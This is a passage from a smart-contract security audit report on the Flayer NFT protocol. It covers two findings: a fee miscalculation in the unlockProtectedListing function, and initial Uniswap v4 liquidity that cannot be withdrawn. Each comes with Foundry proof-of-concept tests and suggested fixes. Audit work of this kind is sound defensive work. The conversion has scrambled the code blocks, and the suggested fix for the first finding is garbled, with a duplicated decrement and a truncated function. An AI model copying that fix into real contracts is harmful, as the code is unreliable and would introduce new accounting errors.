    // Ensure this is a protected listing
    ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
    // Ensure the caller owns the listing
    if (listing.owner != msg.sender) revert CallerIsNotOwner(listing.owner);
    // Ensure that the protected listing has run out of collateral
    int collateral = getProtectedListingHealth(_collection, _tokenId);
    if (collateral < 0) revert InsufficientCollateral();
    // cache
    ICollectionToken collectionToken = locker.collectionToken(_collection);
    uint denomination = collectionToken.denomination();
    uint96 tokenTaken = _protectedListings[_collection][_tokenId].tokenTaken;
    // Repay the loaned amount, plus a fee from lock duration
    uint fee = unlockPrice(_collection, _tokenId) * 10 ** denomination;
    collectionToken.burnFrom(msg.sender, fee);
    // We need to burn the amount that was paid into the Listings contract
    collectionToken.burn((1 ether - tokenTaken) * 10 ** denomination);
    // Remove our listing type
    unchecked { --listingCount[_collection]; }
}
\u0060\u0060\u0060
// Delete the listing objects
delete _protectedListings[_collection][_tokenId];
// Transfer the listing ERC721 back to the user
if (_withdraw) {
    locker.withdrawToken(_collection, _tokenId, msg.sender);
    emit ListingAssetWithdraw(_collection, _tokenId);
} else {
    canWithdrawAsset[_collection][_tokenId] = msg.sender;
}
// Update our checkpoint to reflect that listings have been removed
_createCheckpoint(_collection);
// Emit an event
emit ListingUnlocked(_collection, _tokenId, fee);

As can be seen, the above function decrease listingCount[_collection] in L311 before creating checkpoint in L325. However, creating checkpoint uses utilization rate and the utilization rate depends on listingCount[_collection]. Since listingCount[_collection] is already decreased at L311, the utilization rate is calculated incorrect and so the checkpoint will be incorrect.

PoC: Add the following test code into ProtectedListings.t.sol.
function test_unlockProtectedListingError() public {
    erc721a.mint(address(this), 0);
    erc721a.mint(address(this), 1);
    erc721a.setApprovalForAll(address(protectedListings), true);
    uint[] memory _tokenIds = new uint[](2); _tokenIds[0] = 0; _tokenIds[1] = 1;
    // create protected listing for tokenId = 0 and tokenId = 1
    IProtectedListings.CreateListing[] memory _listings = new IProtectedListings.CreateListing[](1);
    _listings[0] = IProtectedListings.CreateListing({
        collection: address(erc721a),
        tokenIds: _tokenIds,
        listing: IProtectedListings.ProtectedListing({
            owner: payable(address(this)),
            tokenTaken: 0.4 ether,
            checkpoint: 0
        })
    });
    protectedListings.createListings(_listings);
    vm.warp(block.timestamp + 7 days);
}
\u0060\u0060\u0060solidity
// unlock protected listing for tokenId = 0
assertEq(protectedListings.unlockPrice(address(erc721a), 0),
          402485479451875840);
locker.collectionToken(address(erc721a)).approve(address(protectedListings),
          402485479451875840);
protectedListings.unlockProtectedListing(address(erc721a), 0, true);
// unlock protected listing for tokenId = 0, but the unlock price for tokenId =
          1 is 402055890410801920 < 402485479451875840 for tokenId = 0.
assertEq(protectedListings.unlockPrice(address(erc721a), 1),
          402055890410801920);
locker.collectionToken(address(erc721a)).approve(address(protectedListings),
          402055890410801920);
protectedListings.unlockProtectedListing(address(erc721a), 1, true);
\u0060\u0060\u0060

In the above test code, we can see that user paid less fees for tokenId = 1 than tokenId = 0.

Users will pay less fees. It means a loss of funds for the protocol.

[GitHub Code Snippet](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L287-L329)

Manual Review

Change the order of decreasing listingCount[_collection] and creating checkpoint in ProtectedListings.unlockProtectedListing() function as follows.

\u0060\u0060\u0060solidity
function unlockProtectedListing(address _collection, uint _tokenId, bool
          _withdraw) public lockerNotPaused {
    // Ensure this is a protected listing
    ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
    // Ensure the caller owns the listing
    if (listing.owner != msg.sender) revert CallerIsNotOwner(listing.owner);
}
\u0060\u0060\u0060
// Ensure that the protected listing has run out of collateral
int collateral = getProtectedListingHealth(_collection, _tokenId);
if (collateral < 0) revert InsufficientCollateral();
// cache
ICollectionToken collectionToken = locker.collectionToken(_collection);
uint denomination = collectionToken.denomination();
uint96 tokenTaken = _protectedListings[_collection][_tokenId].tokenTaken;
// Repay the loaned amount, plus a fee from lock duration
uint fee = unlockPrice(_collection, _tokenId) * 10 ** denomination;
collectionToken.burnFrom(msg.sender, fee);
// We need to burn the amount that was paid into the Listings contract
collectionToken.burn((1 ether - tokenTaken) * 10 ** denomination);
// Remove our listing type
unchecked { --listingCount[_collection]; }
// Delete the listing objects
delete _protectedListings[_collection][_tokenId];
// Transfer the listing ERC721 back to the user
if (_withdraw) {
    locker.withdrawToken(_collection, _tokenId, msg.sender);
    emit ListingAssetWithdraw(_collection, _tokenId);
} else {
    canWithdrawAsset[_collection][_tokenId] = msg.sender;
}
// Update our checkpoint to reflect that listings have been removed
_createCheckpoint(_collection);
unchecked { --listingCount[_collection]; }
// Emit an event
emit ListingUnlocked(_collection, _tokenId, fee);
## Issue H-8: Liquidity provided when initializing a collection in Locker.sol will be stuck in Uniswap, with no way for the user to recover it

Source: [https://github.com/sherlock-audit/2024-08-flayer-judging/issues/248](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/248)  
Found by: 0x37, BugPull, Feder, KingNFT, Ollam, ZeroTrust, merlinboii, zzykxx

UniswapImplementation.sol does not offer a way to withdraw the initial liquidity provided from the pool, causing the total loss of funds for any user who initializes a pool.

Interacting with Uniswap v4 requires a peripheral contract to unlock() the PoolManager, which then calls unlockCallback() on said peripheral contract. It is the job of unlockContract() to handle any interactions with PoolManager, including modifying liquidity. In UniswapImplementation.sol, the only time it ever calls unlock() on the PoolManager is once during initialization. After that, it is impossible for the Implementation contract to modify the liquidity of the Pool on behalf of the depositor. Positions in PoolManager are credited to the contract that calls modifyLiquidity() on it. This means that the Implementation contract technically owns the liquidity provided by the user, and if the contract does not contain logic to withdraw funds on behalf of said user, the funds are lost for good.

\u0060\u0060\u0060solidity
function initializeCollection(address _collection, uint _amount0, uint _amount1, uint _amount1Slippage, uint160 _sqrtPriceX96) public override {
    // Ensure that only our {Locker} can call initialize
    if (msg.sender != address(locker)) revert CallerIsNotLocker();
    ...
    // Obtain the UV4 lock for the pool to pull in liquidity
    poolManager.unlock( // @audit this is the only place unlock is ever called
        abi.encode(CallbackData({
            poolKey: poolKey,
            liquidityDelta: LiquidityAmounts.getLiquidityForAmounts({
                sqrtPriceX96: _sqrtPriceX96,
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
sqrtPriceAX96: TICK_SQRT_PRICEAX96,
sqrtPriceBX96: TICK_SQRT_PRICEBX96,
amount0: poolParams.currencyFlipped ? _amount1 : _amount0,
amount1: poolParams.currencyFlipped ? _amount0 : _amount1
}),
liquidityTokens: _amount1,
liquidityTokenSlippage: _amount1Slippage
})
));
}
function _unlockCallback(bytes calldata _data) internal override returns (bytes
memory) {
    ...
    // As this call should only come in when we are initializing our pool, we
    // don\u0027t need to worry about \u0060take\u0060 calls, but only \u0060settle\u0060 calls.
    (BalanceDelta delta,) = poolManager.modifyLiquidity({ // @audit only place
    liquidity is ever modified
        key: params.poolKey,
        params: IPoolManager.ModifyLiquidityParams({
            tickLower: MIN_USABLE_TICK,
            tickUpper: MAX_USABLE_TICK,
            liquidityDelta: int(uint(params.liquidityDelta)), // @audit
            liquidityDelta cast so that it can only ever be positive
            salt: \u0027\u0027
        }),
        hookData: \u0027\u0027
    });
This is in PoolManager.sol:
function modifyLiquidity(
    PoolKey memory key,
    IPoolManager.ModifyLiquidityParams memory params,
    bytes calldata hookData
) external onlyWhenUnlocked noDelegateCall returns (BalanceDelta callerDelta,
BalanceDelta feesAccrued) {
    BalanceDelta principalDelta;
    (principalDelta, feesAccrued) = pool.modifyLiquidity(
        Pool.ModifyLiquidityParams({
            owner: msg.sender, // @audit owner of liquidity position set to the
            Implementation contract
            tickLower: params.tickLower,
            tickUpper: params.tickUpper,
            liquidityDelta: params.liquidityDelta.toInt128(),
            tickSpacing: key.tickSpacing,
            salt: params.salt
\u0060\u0060\u0060
No response

No response

No response

Users will lose all funds deposited as liquidity in the collection initialization process. That is a minimum loss of 10 NFTs plus whatever WETH was provided for the other side of the liquidity pool. This leaves zero incentive for anyone to initialize a collection on the protocol.

Proof of Concept is difficult for this one because the issue is about missing functionality, not broken functionality. However, the following code demonstrates a user initializing a collection and thereby funding a liquidity pool. Given that no function exists to allow the user to withdraw via the implementation contract, I\u0027ve used \u0060PoolModifyLiquidityTest\u0060 to provide the functionality, showing that it does not work for the original depositor (because it was deposited with a different peripheral contract) but does work for someone who deposits and withdraws via the same contract.

Please copy and paste import \u0060PoolModifyLiquidityTest\u0060 from \u0060@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol\u0060; to the top of \u0060Locker.t.sol\u0060, and the following test into the body of the file:

\u0060\u0060\u0060solidity
function test_InitializerLosesLiquidityProvided() public {
    address depositoor = makeAddr("depositoor");
    vm.startPrank(depositoor);
    ERC721Mock astroidDogs = new ERC721Mock();
    // Approve some of the ERC721Mock collections in our {Listings}
    locker.createCollection(address(astroidDogs), \u0027Astroid Dogs\u0027, \u0027ADOG\u0027, 0);
    address adog = address(locker.collectionToken(address(astroidDogs)));
    // mint the depositor enough dogs and eth, approve locker to spend
    uint[] memory tokenIds = new uint[](10);
    for (uint i = 0; i < 10; ++i) {
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
astroidDogs.mint(depositoor, i);
tokenIds[i] = i;
astroidDogs.approve(address(locker), i);
}
deal(address(WETH), depositoor, 10e18);
WETH.approve(address(locker), 10e18);
// initialize collection
//slippage and
→ squrtPrice //1:1
locker.initializeCollection(address(astroidDogs), 10e18, tokenIds, 1,
→ 79228162514264337593543950336);
// there is no method to withdraw via locker or implementation
// does a peripheral contract let us do this?
// using poolModifyPosition as a helper
// peripheral contract to allow deposits and withdrawals
PoolModifyLiquidityTest poolModifyPosition = new
→ PoolModifyLiquidityTest(poolManager);
PoolKey memory key =
→ abi.decode(uniswapImplementation.getCollectionPoolKey(address(astroidDogs)),
→ (PoolKey));
IPoolManager.ModifyLiquidityParams memory params =
→ IPoolManager.ModifyLiquidityParams({
       tickLower: TickMath.minUsableTick(key.tickSpacing),
       tickUpper: TickMath.maxUsableTick(key.tickSpacing),
       liquidityDelta: -100,
       salt: ""
});
// the user who initiated it is unable to withdraw it with a different
→ peripheral contract
// that\u0027s because the Implementation   contract owns the liquidity
vm.expectRevert();
poolModifyPosition.modifyLiquidity(key, params, "");
// however, this peripheral contract would work for another user who deposits
→ with it
address secondDepositor = makeAddr("second");
vm.startPrank(secondDepositor);
// deal and approve funds
deal(adog, secondDepositor, 1e18);
deal(address(WETH), secondDepositor, 1e18);
locker.collectionToken(address(astroidDogs)).approve(address(poolModifyPosition),
→ ), 10e18);
WETH.approve(address(poolModifyPosition), 10e18);
\u0060\u0060\u0060
// deposit and withdraw - no problem for this user
IPoolManager.ModifyLiquidityParams memory depositParams =
    IPoolManager.ModifyLiquidityParams({
        tickLower: TickMath.minUsableTick(key.tickSpacing),
        tickUpper: TickMath.maxUsableTick(key.tickSpacing),
        liquidityDelta: 1e18,
        salt: ""
    });
poolModifyPosition.modifyLiquidity(key, depositParams, "");
IPoolManager.ModifyLiquidityParams memory withdrawParams =
    IPoolManager.ModifyLiquidityParams({
        tickLower: TickMath.minUsableTick(key.tickSpacing),
        tickUpper: TickMath.maxUsableTick(key.tickSpacing),
        liquidityDelta: -1e18,
        salt: ""
    });
poolModifyPosition.modifyLiquidity(key, withdrawParams, "");

Consider the following changes to UniswapImplementation.sol:
1. Store the user who initializes a collection in a mapping.
2. Change _unlockCallback() such that it doesn\u0027t cast liquidityDelta to a uint (must allow negative values for withdrawals).
3. Add a removeLiquidity function to Implementation.sol. It should check that only the initializer of a contract can call it and should call unlock() on the PoolManager, passing in the appropriate call data to remove liquidity. It should then transfer funds received to the user.

These changes will allow a user to access the liquidity he or she initially provided.
